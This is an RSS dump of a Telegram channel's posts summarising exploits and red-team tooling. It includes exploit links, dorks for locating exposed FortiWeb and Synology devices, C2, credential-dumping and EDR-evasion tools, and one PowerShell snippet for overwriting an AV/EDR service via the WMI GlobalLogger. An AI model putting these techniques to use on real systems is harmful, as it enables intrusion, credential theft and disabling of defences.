+В официальном блоге React только что выкатили пост про CVE-2025-55182, которая позволяет в один запрос получить RCE. Уязвимы версии 19.0.0, 19.1.0, 19.1.1, 19.2.0, а еще фреймворки Next.JS, Vite, Parcel, и Waku.
+Сам баг находится в RSC-рантайме, который принимает данные и небезопасно десериализует их. Уязвимость можно считать одной из самых критичных, которые находили в React за все время.
+Exploit: https://github.com/ejpir/CVE-2025-55182-poc
+YAML-шаблон для nuclei: https://github.com/sickwell/CVE-2025-55182/blob/main/cve-2025-55182.yaml
+#exploit #работягам
+Telegram  ✉️ @freedomfox
+
+[Media: Фото]</description><pubDate>Thu, 04 Dec 2025 04:07:22 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_203</guid></item><item><title>K7 Antivirus: Named pipe abuse, registry manipulation and privilege escalation</title><link>https://t.me/P0x3k_1N73LL1G3NC3/202</link><description>K7 Antivirus: Named pipe abuse, registry manipulation and privilege escalation
+My initial testing was done on version 17.0.2045 (July 2025). In this post I describe my journey from installation to SYSTEM privileges.
+Exploit 1 - Allow any user to change the AV configuration
+Exploit 2 - LPE
+
+[Media: Видео]</description><pubDate>Tue, 02 Dec 2025 19:49:34 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_202</guid></item><item><title>Synology BeeStation RCE &amp; A Novel SQLite Injection RCE Technique (CVE-2024-50629~50631)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/201</link><description>Synology BeeStation RCE &amp; A Novel SQLite Injection RCE Technique (CVE-2024-50629~50631)
+This chain is a compelling case study of how chaining seemingly low-severity primitives can bridge the gap to full system compromise. A CRLF injection reads limited file, a conditional auth bypass, and a post-auth SQL injection—while individually limited, they become critical when chained together.
+• CVE-2024-50629: Synology BeeStation BST150-4T CRLF Injection Information Disclosure Vulnerability
+• CVE-2024-50631: This
+vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of Synology BeeStation BST150-4T devices. Authentication is required to exploit this vulnerability.
+Exploit: https://github.com/kiddo-pwn/CVE-2024-50629_50631
+AFFECTED PRODUCTS:
+BeeStation BST150-4T
+Tweet: https://x.com/kiddo_pwn/status/1995435316304588881?s=46
+Search Query: service: “synology” tag: “NAS” title: DiskStation
+
+[Media: Фото]</description><pubDate>Mon, 01 Dec 2025 16:20:08 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_201</guid></item><item><title>🐾Meow</title><link>https://t.me/P0x3k_1N73LL1G3NC3/200</link><description>🐾Meow
+
+[Media: Фото]</description><pubDate>Fri, 21 Nov 2025 09:15:19 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_200</guid></item><item><title>Fortinet 0day  An auth bypass + path traversal in Fortinet FortiWeb to create new administrative users on exposed devices without requiring authentication.  Blog:    •...</title><link>https://t.me/P0x3k_1N73LL1G3NC3/199</link><description>Fortinet 0day  An auth bypass + path traversal in Fortinet FortiWeb to create new administrative users on exposed devices without requiring authentication.  Blog:    • https://www.rapid7.com/blog/post/etr-critical-vulnerability-in-fortinet-fortiweb-exploited…
+
+[Media: Фото]</description><pubDate>Thu, 20 Nov 2025 16:57:07 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_199</guid></item><item><title>SAMDump</title><link>https://t.me/P0x3k_1N73LL1G3NC3/198</link><description>SAMDump
+Extracts SAM and SYSTEM using Volume Shadow Copy (VSS) API with multiple exfiltration options and XOR obfuscation.
+
+[Media: Фото]</description><pubDate>Wed, 19 Nov 2025 10:36:43 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_198</guid></item><item><title>Fortinet 0day</title><link>https://t.me/P0x3k_1N73LL1G3NC3/197</link><description>Fortinet 0day
+An auth bypass + path traversal in Fortinet FortiWeb to create new administrative users on exposed devices without requiring authentication.
+Blog:
+• https://www.rapid7.com/blog/post/etr-critical-vulnerability-in-fortinet-fortiweb-exploited-in-the-wild/
+• https://labs.watchtowr.com/when-the-impersonation-function-gets-used-to-impersonate-users-fortinet-fortiweb-auth-bypass/
+Tweet: https://x.com/defusedcyber/status/1975242250373517373?s=46
+Metasploit module: https://github.com/rapid7/metasploit-framework/pull/20698
+Dork:
+ZoomEye Dork: app="FortiWeb"
+HUNTER: product.name="FortiWeb"
+Shodan: http.title:FortiWeb
+Affected versions:
+• 8.0: &lt;8.0.2
+• 7.6: &lt;7.6.5
+• 7.4: &lt;7.4.10
+• 7.2: &lt;7.2.12
+• 7.0: &lt;7.0.12
+• 6.4: &lt;= 6.4.3
+• 6.3: &lt;= 6.3.23
+
+[Media: Видео]</description><pubDate>Fri, 14 Nov 2025 11:15:25 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_197</guid></item><item><title>CVE-2025-60710 Local Privilege Escalation in Taskhost Windows Tasks</title><link>https://t.me/P0x3k_1N73LL1G3NC3/196</link><description>CVE-2025-60710 Local Privilege Escalation in Taskhost Windows Tasks
+This is PoC for local privilege escalation vulnerability in \Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration scheduled task.
+When this scheduled task is started the taskhostw.exe process whill try to open the C:\Users\%username%\AppData\Local\CoreAIPlatform.00\UKP directory and search for directories using the following filter: {????????-????-????-????-????????????}. If that directory is found it will be deleted without checking for symbolic links.
+As low privilege user by default can create directories in their own %LOCALAPPDATA% folder this leads to arbitrary folder delete in context of NT AUTHORITY\SYSTEM user.
+
+[Media: Фото]</description><pubDate>Wed, 12 Nov 2025 09:09:11 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_196</guid></item><item><title>😈 Venom C2</title><link>https://t.me/P0x3k_1N73LL1G3NC3/195</link><description>😈 Venom C2
+A dependency‑free Python3 Command &amp; Control framework for redteam persistence, built to run on systems without installing packages. It comprises a Flask team server, an Electron operator GUI, and a single‑file Python agent that communicates over HTTP/HTTPS using configurable AES‑encrypted JSON messages. Use it to execute commands, manage files, maintain access, and create SSH reverse tunnels from compromised systems.
+
+[Media: Фото]</description><pubDate>Fri, 07 Nov 2025 20:02:32 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_195</guid></item><item><title>🎃Booo!</title><link>https://t.me/P0x3k_1N73LL1G3NC3/194</link><description>🎃Booo!
+
+[Media: Фото]</description><pubDate>Thu, 06 Nov 2025 14:48:52 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_194</guid></item><item><title>🪟 CVE-2025-50168: Windows 11 LPE Exploit</title><link>https://t.me/P0x3k_1N73LL1G3NC3/193</link><description>🪟 CVE-2025-50168: Windows 11 LPE Exploit
+Windows win32kbase Type Confusion Local Privilege Escalation Vulnerability (CVSS 8.8). Pwn2Own Berlin 2025 winning bug.
+Blog: https://www.oobs.io/posts/four-bytes-one-lie/
+
+[Media: Фото]</description><pubDate>Wed, 05 Nov 2025 20:47:05 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_193</guid></item><item><title>SilentButDeadly</title><link>https://t.me/P0x3k_1N73LL1G3NC3/192</link><description>SilentButDeadly
+A network communication blocker specifically designed to neutralize EDR/AV software by preventing their cloud connectivity using Windows Filtering Platform (WFP). This version focuses solely on network isolation without process termination.
+Blog: https://ryan.framinan.net/blog/silentbutdeadly
+
+[Media: Фото]</description><pubDate>Tue, 04 Nov 2025 08:39:15 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_192</guid></item><item><title>Conquest</title><link>https://t.me/P0x3k_1N73LL1G3NC3/191</link><description>Conquest
+A feature-rich and malleable command &amp; control/post-exploitation framework developed in Nim.
+Blog: https://jakobfriedl.github.io/blog/nim-c2-traffic/
+
+[Media: Фото]</description><pubDate>Mon, 03 Nov 2025 17:28:27 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_191</guid></item><item><title>Как круто развивается BloodHound... Теперь и сетевые ресурсы можно отображать</title><link>https://t.me/P0x3k_1N73LL1G3NC3/190</link><description>Как круто развивается BloodHound... Теперь и сетевые ресурсы можно отображать
+Blog: https://specterops.io/blog/2025/10/30/sharehound-an-opengraph-collector-for-network-shares/
+Soft: https://github.com/p0dalirius/sharehound
+#pentest #ad #bloodhound
+
+[Media: Фото]</description><pubDate>Thu, 30 Oct 2025 18:02:34 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_190</guid></item><item><title>Exploiting Ghost SPNs and Kerberos Reflection for SMB Server Privilege Elevation</title><link>https://t.me/P0x3k_1N73LL1G3NC3/189</link><description>Exploiting Ghost SPNs and Kerberos Reflection for SMB Server Privilege Elevation
+In an attack exploiting CVE‑2025‑58726, a bad actor would perform the following steps:
+• Identify a Ghost SPN on the target machine.
+• Register a DNS record for the Ghost SPN pointing to the attacker machine.
+• Use a Kerberos relay tool (e.g., my KrbRelayEx script, available on GitHub) to intercept the Kerberos authentication.
+• Trigger authentication for the target machine (e.g., using Printer Bug, PetitPotam, or similar).
+• Relay the Kerberos ticket back to the target machine.
+• Gain SYSTEM access via SMB and execute arbitrary commands.
+P.S.
+This attack targets Kerberos by abusing misconfigured SPNs; it does not affect NTLM.
+The fix for CVE-2025-33073 (Windows SMB Client Elevation of Privilege Vulnerability) addressed a specific SMB client issue. However, the Ghost SPN attack method bypasses that fix. The vulnerability lies in Kerberos itself, which fails to prevent authentication reflection. The same approach can be applied to other protocols that rely on Kerberos.
+
+[Media: Фото]</description><pubDate>Wed, 29 Oct 2025 20:50:42 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_189</guid></item><item><title>UnderlayCopy</title><link>https://t.me/P0x3k_1N73LL1G3NC3/188</link><description>UnderlayCopy
+PowerShell toolkit that extracts locked Windows files (SAM, SYSTEM, NTDS, ...) using MFT parsing and raw disk reads.
+
+[Media: Фото]</description><pubDate>Tue, 28 Oct 2025 16:28:02 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_188</guid></item><item><title>👽 Boooost!</title><link>https://t.me/P0x3k_1N73LL1G3NC3/187</link><description>👽 Boooost!
+
+[Media: Фото]</description><pubDate>Tue, 28 Oct 2025 09:05:13 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_187</guid></item><item><title>CVE-2025-33073: Reflective Kerberos Relay (LPE)   Blog: https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/  Patched: June 10, 2025  Интересная LPE с релеем на себя... Даже CVE...</title><link>https://t.me/P0x3k_1N73LL1G3NC3/185</link><description>CVE-2025-33073: Reflective Kerberos Relay (LPE)   Blog: https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/  Patched: June 10, 2025  Интересная LPE с релеем на себя... Даже CVE есть)   #lpe #ad #relay #pentest #redteam
+
+[Media: Фото, Видео]</description><pubDate>Mon, 27 Oct 2025 17:34:37 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_185</guid></item><item><title>CVE-2025-59287</title><link>https://t.me/P0x3k_1N73LL1G3NC3/184</link><description>CVE-2025-59287
+WSUS Unauthenticated RCE. This vulnerability arises from the unsafe deserialization of AuthorizationCookie objects sent to the GetCookie() endpoint, where encrypted cookie data is decrypted using AES-128-CBC and subsequently deserialized through BinaryFormatter without proper type validation, enabling remote code execution with SYSTEM privileges.
+
+[Media: Фото, Видео]</description><pubDate>Mon, 27 Oct 2025 15:51:03 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_184</guid></item><item><title>AsmLdr</title><link>https://t.me/P0x3k_1N73LL1G3NC3/183</link><description>AsmLdr
+Dynamic shellcode loader with sophisticated evasion capabilities.
+
+[Media: Видео]</description><pubDate>Wed, 05 Nov 2025 08:36:16 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_183</guid></item><item><title>📄 Catching Credential Guard Off Guard</title><link>https://t.me/P0x3k_1N73LL1G3NC3/182</link><description>📄 Catching Credential Guard Off Guard
+Credential Guard was supposed to end credential dumping. It didn't. @bytewreck just dropped a new blog post detailing techniques for extracting credentials on fully patched Windows 11 &amp; Server 2025 with modern protections enabled.
+🔗 DumpGuard
+Proof-of-Concept tool for extracting NTLMv1 hashes from sessions on modern Windows systems.
+P.S. Previously, crack.sh operated a free service for performing rainbow table lookups to recover NT hashes from NTLMv1 responses, but was recently shut down due to maintenance issues. In its absence, a new free service was published at ntlmv1.com.
+
+[Media: Фото, Видео]</description><pubDate>Thu, 23 Oct 2025 21:15:36 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_182</guid></item><item><title>Printerbugnew</title><link>https://t.me/P0x3k_1N73LL1G3NC3/181</link><description>Printerbugnew
+Pure RPC over TCP Printer Spooler Trigger for Windows 11 22H2+ / Windows Server 2025
+Coercing machine authentication on Windows 11 /2025 using the MS-PRN/PrinterBug DCERPC edition, since named pipes are no longer used. Kerberos fails in this case due to a bad SPN from the spooler, forcing NTLM fallback.
+
+[Media: Фото, Видео]</description><pubDate>Wed, 22 Oct 2025 09:40:00 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_181</guid></item><item><title>📄 The (Near) Return of the King: Account Takeover Using the BadSuccessor Technique</title><link>https://t.me/P0x3k_1N73LL1G3NC3/179</link><description>📄 The (Near) Return of the King: Account Takeover Using the BadSuccessor Technique
+After Microsoft patched Yuval Gordon’s BadSuccessor privilege escalation technique, BadSuccessor returned with another blog from Yuval, briefly mentioning to the community that attackers can still abuse dMSAs to take over any object where we have a write primitive. This mention did not gather significant attention from the community, leaving an operational gap for dMSA related tooling and attention. This blog dives into why dMSA abuse is still a problem, the release of a new Beacon object file (BOF) labeled BadTakeover, plus additions to SharpSuccessor, all to show that BadSuccessor’s impact as a technique (not a vulnerability) will still hold a lasting effect.
+🔗 BadTakeover-BOF
+Beacon Object File (BOF) for Using the BadSuccessor Technique for Account Takeover
+
+[Media: Фото, Видео]</description><pubDate>Mon, 20 Oct 2025 18:36:37 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_179</guid></item><item><title>Evasion-Kit for Cobalt Strike</title><link>https://t.me/P0x3k_1N73LL1G3NC3/178</link><description>Evasion-Kit for Cobalt Strike
+Blog: https://rastamouse.me/crystal-kit/
+Soft: https://github.com/rasta-mouse/Crystal-Kit
+#maldev #cs #pentest #redteam
+
+[Media: Видео]</description><pubDate>Mon, 13 Oct 2025 06:10:31 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_178</guid></item><item><title>🥁 EternalBlue?</title><link>https://t.me/P0x3k_1N73LL1G3NC3/177</link><description>🥁 EternalBlue?
+
+[Media: Фото, Видео]</description><pubDate>Mon, 06 Oct 2025 09:01:27 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_177</guid></item><item><title>OWA Pentest Guide</title><link>https://t.me/P0x3k_1N73LL1G3NC3/176</link><description>OWA Pentest Guide
+В статье разобраны все основные атаки и уязвимости OWA и MS Exchange:
+• OSINT
+• Password spraying
+• GAL/OAB
+• Архитектура работы
+• ZDI-CAN-22101
+• OWA CAP Bypass
+• CVE-2020-0688
+• ProxyLogon
+• CVE-2021-26855 - Pre-auth SSRF
+• CVE-2021-27065 - Post-auth Arbitrary-File-Write
+• ProxyOracle
+• CVE-2021-31196 - The Padding Oracle
+• CVE-2021-31195 - XSS
+• Обход HttpOnly
+• ProxyShell
+• CVE-2021-34473 - Pre-auth Path Confusion leads to ACL Bypass
+• CVE-2021-34523 - Exchange PowerShell Backend Elevation-of-Privilege
+• CVE-2021-31207 - Post-auth Arbitrary-File-Write
+• ProxyNotShell
+• ProxyRelay
+• Relay атаки
+Thx: @pentestnotes
+
+[Media: Фото, Видео]</description><pubDate>Mon, 06 Oct 2025 08:24:51 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_176</guid></item><item><title>🐶 NetworkHound</title><link>https://t.me/P0x3k_1N73LL1G3NC3/175</link><description>🐶 NetworkHound
+NetworkHound connects to Active Directory Domain Controllers, discovers computer objects, resolves hostnames to IP addresses using multiple DNS methods, performs comprehensive network scanning (port scanning, HTTP/HTTPS validation), and discovers shadow-IT devices. It then builds a detailed network topology graph in OpenGraph JSON format compatible with BloodHound.
+
+[Media: Фото, Видео]</description><pubDate>Sat, 04 Oct 2025 10:52:57 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_175</guid></item><item><title>MaldevAcademyLdr.2</title><link>https://t.me/P0x3k_1N73LL1G3NC3/174</link><description>MaldevAcademyLdr.2
+RunPE implementation with multiple evasive techniques
+
+[Media: Фото, Видео]</description><pubDate>Mon, 29 Sep 2025 18:21:20 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_174</guid></item><item><title>Как убить службу AV/EDR не прибегая к symlink и сторонним драйверам в Windows</title><link>https://t.me/P0x3k_1N73LL1G3NC3/173</link><description>Как убить службу AV/EDR не прибегая к symlink и сторонним драйверам в Windows
+Статья име­ет озна­коми­тель­ный харак­тер и пред­назна­чена для спе­циалис­тов по безопас­ности, про­водя­щих тес­тирова­ние в рам­ках кон­трак­та. Автор и редак­ция не несут ответс­твен­ности за любой вред, при­чинен­ный с при­мене­нием изло­жен­ной информа­ции. Рас­простра­нение вре­донос­ных прог­рамм, наруше­ние работы сис­тем и наруше­ние тай­ны перепис­ки прес­леду­ются по закону.
+Как показал кейс с использованием Procmon и аналогичных утилит, ключевая идея состоит в поиске драйвера, который фиксирует события на самых ранних этапах загрузки операционной системы. Возникает естественный вопрос: можно ли обойтись без установки собственных драйверов и дополнительных компонентов, опираясь только на доступные в системе механизмы и не прибегая к символическим ссылкам.
+А что, если немножечко изменить те пути куда уже пишутся какие то логи самой системой?
+И тут есть отличная веточка реестра HKLM\SYSTEM\CurrentControlSet\Control\WMI в которой существуют AutoLogger и GlobalLogger.
+WMI AutoLogger -  способ настраивать одну или несколько автосессий трассировки, которые стартуют при загрузке. В отличие от GlobalLogger, каждая AutoLogger-сессия самостоятельно рассылает провайдерам сигнал включения и может быть точно настроена под нужный набор провайдеров. AutoLogger не предназначен для записи специальных событий ядра NT Kernel Logger - для этого используется GlobalLogger.
+WMI GlobalLogger - исторически более ранний механизм единственной глобальной сессии. Он также стартует на раннем этапе загрузки и может включать ядровые провайдеры через специальные флаги. Важно, что контроллер GlobalLogger не вызывает EnableTrace для провайдеров - провайдер сам должен определить, что глобальная сессия активна, и включить запись.
+В AutoLogger уже есть достаточное количество различных сессий, можете тестировать разные (какие то работают, какие-то нет). В моем случае использовалась HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\ReadyBoot, где можно заменить путь указанный в FileName на путь к файлу службы, который хотим перезаписать.
+Для GlobalLogger по умолчанию у меня не было никаких настроек, но можно добавить их самостоятельно:
+$reg  = [wmiclass]'root\default:StdRegProv'
+$HKLM = 2147483650
+$base = 'SYSTEM\CurrentControlSet\Control\WMI\GlobalLogger'
+$null = $reg.CreateKey($HKLM,$base)
+$reg.SetDWORDValue($HKLM,$base,'Start',1)
+$reg.SetStringValue($HKLM,$base,'FileName','C:\&lt;путь до файла службы который требуется перезаписать&gt;.exe')
+$flags = 0x00000010 -bor 0x00000020
+$bytes = [BitConverter]::GetBytes([UInt32]$flags)
+$reg.SetBinaryValue($HKLM,$base,'EnableKernelFlags',$bytes)
+Из минусов только наличие прав админа и перезагрузка хоста, но в целом выглядит жизнеспособно.
+
+[Media: Фото, Видео]</description><pubDate>Mon, 29 Sep 2025 09:28:38 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_173</guid></item><item><title>FlareProx</title><link>https://t.me/P0x3k_1N73LL1G3NC3/172</link><description>FlareProx
+Simple IP Rotation &amp; URL Redirection via Cloudflare Workers, to avoid detection and blocks. It supports all HTTP methods (GET, POST, PUT, DELETE, etc.) and provides IP masking through Cloudflare's global network. 100k requests per day are free!
+FireProx
+AWS API Gateway management tool for creating on the fly HTTP pass-through proxies for unique IP rotation.
+CredMaster
+Launch a password spray / brute force attach via Amazon AWS passthrough proxies, shifting the requesting IP address for every authentication attempt. This dynamically creates FireProx APIs for more evasive password sprays.
+CredKing
+Password spraying using AWS Lambda for IP rotation
+OmniProx
+A multi-cloud HTTP proxy manager that provides IP rotation and header manipulation capabilities across different cloud providers. It offers a unified interface for managing proxies on various cloud platforms.
+
+[Media: Фото, Видео]</description><pubDate>Sun, 28 Sep 2025 15:40:23 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_172</guid></item><item><title>Thx: @Michaelzhm @RedTeamBro</title><link>https://t.me/P0x3k_1N73LL1G3NC3/171</link><description>Thx: @Michaelzhm @RedTeamBro
+
+[Media: Видео, Документ]</description><pubDate>Sun, 28 Sep 2025 13:48:00 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_171</guid></item><item><title>WSASS  This is a tool that uses the old WerfaultSecure.exe program to dump the memory of processes protected by PPL (Protected Process Light), such as LSASS.EXE. The output is in Windows MINIDUMP...</title><link>https://t.me/P0x3k_1N73LL1G3NC3/170</link><description>WSASS  This is a tool that uses the old WerfaultSecure.exe program to dump the memory of processes protected by PPL (Protected Process Light), such as LSASS.EXE. The output is in Windows MINIDUMP format.
+
+[Media: Фото, Видео]</description><pubDate>Wed, 24 Sep 2025 09:05:16 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_170</guid></item><item><title>👩‍💻 THE PHANTOM EXTENSION: BACKDOORING CHROME THROUGH UNCHARTED PATHWAYS</title><link>https://t.me/P0x3k_1N73LL1G3NC3/169</link><description>👩‍💻 THE PHANTOM EXTENSION: BACKDOORING CHROME THROUGH UNCHARTED PATHWAYS
+The increasing hardening of traditional Windows components such as LSASS has pushed attackers to explore alternative entry points. Among these, web browsers have emerged as highly valuable targets since they are now the primary gateway to sensitive data and enterprise cloud services. Numerous secrets, including tokens and credentials, flows through browsers, and their compromise can provide attackers with extensive access across an organization. This article presents a little-known technique for compromising Chromium-based browsers within Windows domains by forcing the loading of arbitrary extensions.
+🔗 CursedChrome
+Chrome-extension implant that turns victim Chrome browsers into fully-functional HTTP proxies, allowing you to browse sites as your victims.
+
+[Media: Видео]</description><pubDate>Wed, 05 Nov 2025 08:36:16 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_169</guid></item><item><title>EDR-Freeze</title><link>https://t.me/P0x3k_1N73LL1G3NC3/168</link><description>EDR-Freeze
+This is a tool that exploits the software vulnerability of WerFaultSecure to suspend the processes of EDRs and antimalware without needing to use the BYOVD (Bring Your Own Vulnerable Driver) attack method. EDR-Freeze operates in user mode, so you don't need to install any additional drivers.
+Blog: https://www.zerosalarium.com/2025/09/EDR-Freeze-Puts-EDRs-Antivirus-Into-Coma.html?m=1
+P.S. The experiment was conducted with the latest version of Windows at the time of the project creation: Windows 11 24H2
+
+[Media: Фото, Видео]</description><pubDate>Sun, 21 Sep 2025 04:40:16 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_168</guid></item><item><title>📄 More Fun With WMI</title><link>https://t.me/P0x3k_1N73LL1G3NC3/167</link><description>📄 More Fun With WMI
+Win32_Process has been the go to WMI class for remote command execution for years. In this post we will cover a new WMI class that functions like Win32_Process and offers further capability.
+🔗 WMI_Proc_Dump.py
+Dump processes over WMI with MSFT_MTProcess
+🔗 mtprocess.py
+Python script that uses Impacket to use the MSFT_MTProcess WMI class to execute a command. If wanting to use against a Workstation it can install the provider.
+P.S. One more way to dump LSASS.
+
+[Media: Фото, Видео]</description><pubDate>Sat, 20 Sep 2025 08:56:41 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_167</guid></item><item><title>Obex - DLL Blocking</title><link>https://t.me/P0x3k_1N73LL1G3NC3/166</link><description>Obex - DLL Blocking
+A PoC tool/technique that can be used to prevent unwanted modules (e.g., EDR or monitoring libraries) from being loaded into a newly started process during process initialization or at runtime.
+P.S. The screenshot shows obex spawning powershell.exe with the default blocklist (only amsi.dll). Additionally you can see the spawned process’s module list to verify that amsi.dll was not loaded.
+
+[Media: Фото, Видео]</description><pubDate>Fri, 19 Sep 2025 16:19:23 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_166</guid></item><item><title>WSASS</title><link>https://t.me/P0x3k_1N73LL1G3NC3/165</link><description>WSASS
+This is a tool that uses the old WerfaultSecure.exe program to dump the memory of processes protected by PPL (Protected Process Light), such as LSASS.EXE. The output is in Windows MINIDUMP format.
+
+[Media: Фото, Видео]</description><pubDate>Sat, 13 Sep 2025 19:24:30 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_165</guid></item><item><title>pyLDAPGui</title><link>https://t.me/P0x3k_1N73LL1G3NC3/164</link><description>pyLDAPGui
+A cross-platform python based GUI for browsing LDAP (similar to Sysinternals' ADExplorer). It offers features such as tree-view browsing, direct connection to a Neo4j database, and easy-to-use export options to formats like CSV and Bloodhound data.
+
+[Media: Видео]</description><pubDate>Wed, 05 Nov 2025 08:36:16 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_164</guid></item><item><title>MFTool</title><link>https://t.me/P0x3k_1N73LL1G3NC3/163</link><description>MFTool
+A red team-oriented NTFS parser. Instead of asking Windows for files, it parses the on-disk structures of a mounted NTFS volume directly to build an in-memory copy of the Master File Table.
+P.S.: Retrieve file contents without opening an OS-level file handle, enabling access to data that is typically locked by the operating system (e.g., SAM, SYSTEM and SECURITY to dump the registry hives without making any use of the corresponding registry API functions. The resulting files can then be parsed directly with tools like secretsdump).
+
+[Media: Видео]</description><pubDate>Wed, 05 Nov 2025 08:36:16 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_163</guid></item><item><title>Dittobytes</title><link>https://t.me/P0x3k_1N73LL1G3NC3/162</link><description>Dittobytes
+Metamorphic cross-compilation of C++ &amp; C-code to PIC, BOF &amp; EXE for Windows, MacOS, and Linux, and both AMD64 and ARM64. It features a metamorphic engine that ensures each compilation produces unique, functional shellcode. It does not rely on the classic decrypt stubs often seen in e.g. polymorphic compilations, and additionally it does not require reflective loaders such as Donut or sRDI as it can compile your C-code directly to PIC. A subsequent advantage is that the output size of the shellcode is extremely small (almost no overhead), and remains very simple.
+
+[Media: Фото, Видео]</description><pubDate>Sun, 07 Sep 2025 11:00:41 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_162</guid></item><item><title>🧩 When too much access is not enough: a story about Confluence and tokens</title><link>https://t.me/P0x3k_1N73LL1G3NC3/161</link><description>🧩 When too much access is not enough: a story about Confluence and tokens
+During a Red Team engagement, we compromised an AWS account containing a Confluence instance hosted on an EC2 virtual machine. Although we fully compromised the machine hosting the Confluence instance, we did not have valid credentials to log in but were able to interact with the underlying database. This led us to study the structure of the Confluence database and the mechanism for generating API tokens.
+P.S. Еще несколько полезных ссылок со старого канала:
+📜 Creating a Malicious Atlassian Plugin
+🔗 Malfluence
+A PoC for a malicious Confluence plugin, which can access all content inside a Confluence instance, access the database directly, and execute arbitrary commands on the underlying Linux server.
+📜 Stealing All of the Confluence Things
+🔗 Conf-Thief
+A Red Team tool for exfiltrating sensitive data from Confluence pages.
+🔗 AtlasReaper
+A command-line tool for reconnaissance and targeted write operations on Confluence and Jira instances.
+🔗 Jecretz
+Jira Secret Hunter - Helps you find credentials and sensitive contents in Jira tickets.
+
+[Media: Видео]</description><pubDate>Sun, 31 Aug 2025 18:43:34 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_161</guid></item></channel></rss>
